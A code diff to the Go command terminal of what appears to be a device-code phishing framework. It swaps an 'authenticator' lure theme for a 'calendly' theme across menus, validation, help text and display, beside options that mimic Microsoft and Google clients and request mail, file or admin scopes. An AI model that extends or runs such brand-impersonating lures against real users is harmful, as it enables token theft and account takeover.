@@ -378,7 +378,7 @@ func (t *Terminal) handleQuickstart(args []string) error {
 	}{
 		{"", "Default"},
 		{"onedrive", "OneDrive"},
-		{"authenticator", "Authenticator"},
+		{"calendly", "Calendly"},
 		{"lexvault", "LexVault"},
 		{"excel", "Excel Report"},
 		{"sharepoint", "SharePoint"},
@@ -2102,7 +2102,7 @@ func (t *Terminal) handleLures(args []string) error {
 				}{
 					{"", "Default"},
 					{"onedrive", "OneDrive"},
-					{"authenticator", "Authenticator"},
+					{"calendly", "Calendly"},
 					{"lexvault", "LexVault"},
 					{"excel", "Excel Report"},
 					{"sharepoint", "SharePoint"},
@@ -2284,7 +2284,7 @@ func (t *Terminal) handleLures(args []string) error {
 				if dcTheme != "" {
 					themeLabels := map[string]string{
 						"onedrive":      "OneDrive",
-						"authenticator": "Authenticator",
+						"calendly":      "Calendly",
 						"lexvault":      "LexVault",
 						"excel":         "Excel Report",
 						"sharepoint":    "SharePoint",
@@ -2556,7 +2556,7 @@ func (t *Terminal) handleLures(args []string) error {
 					log.Info("lure '%d' device code template set to: %s", l_id, val)
 				case "dc_theme":
 					val = strings.ToLower(val)
-					validThemes := []string{"default", "onedrive", "authenticator", "lexvault", "excel", "sharepoint"}
+					validThemes := []string{"default", "onedrive", "calendly", "lexvault", "excel", "sharepoint"}
 					valid := false
 					for _, vt := range validThemes {
 						if val == vt {
@@ -2565,7 +2565,7 @@ func (t *Terminal) handleLures(args []string) error {
 						}
 					}
 					if !valid {
-						return fmt.Errorf("edit: invalid theme '%s' (valid: default, onedrive, authenticator, lexvault, excel, sharepoint)", val)
+						return fmt.Errorf("edit: invalid theme '%s' (valid: default, onedrive, calendly, lexvault, excel, sharepoint)", val)
 					}
 					if val == "default" {
 						val = ""
@@ -3236,7 +3236,7 @@ func (t *Terminal) createHelp() {
 				readline.PcItem("dc_client", readline.PcItem("ms_office"), readline.PcItem("ms_teams"), readline.PcItem("azure_cli"), readline.PcItem("ms_outlook"), readline.PcItem("ms_graph"), readline.PcItem("google_cloud_sdk"), readline.PcItem("google_tv"), readline.PcItem("google_device_policy"), readline.PcItem("google_chrome_sync"), readline.PcItem("google_ios")),
 				readline.PcItem("dc_scope", readline.PcItem("full"), readline.PcItem("mail"), readline.PcItem("files"), readline.PcItem("user"), readline.PcItem("minimal"), readline.PcItem("gmail"), readline.PcItem("gdrive"), readline.PcItem("gworkspace"), readline.PcItem("gcalendar"), readline.PcItem("gcontacts"), readline.PcItem("gcloud"), readline.PcItem("gprofile"), readline.PcItem("gadmin"), readline.PcItem("gall")),
 				readline.PcItem("dc_template", readline.PcItem("success"), readline.PcItem("fallback"), readline.PcItem("compliance")),
-				readline.PcItem("dc_theme", readline.PcItem("default"), readline.PcItem("onedrive"), readline.PcItem("authenticator"), readline.PcItem("lexvault"), readline.PcItem("excel"), readline.PcItem("sharepoint")))),
+				readline.PcItem("dc_theme", readline.PcItem("default"), readline.PcItem("onedrive"), readline.PcItem("calendly"), readline.PcItem("lexvault"), readline.PcItem("excel"), readline.PcItem("sharepoint")))),
 			readline.PcItem("delete", readline.PcItem("all"))))
 
 	h.AddSubCommand("lures", nil, "", "show all create lures")
@@ -3761,7 +3761,7 @@ func (t *Terminal) sprintLures() string {
 		switch dcTheme {
 		case "onedrive":
 			dcThemeStr = hiblue.Sprint(dcTheme)
-		case "authenticator":
+		case "calendly":
 			dcThemeStr = hcyan.Sprint(dcTheme)
 		case "lexvault":
 			dcThemeStr = color.New(color.FgHiRed).Sprint(dcTheme)
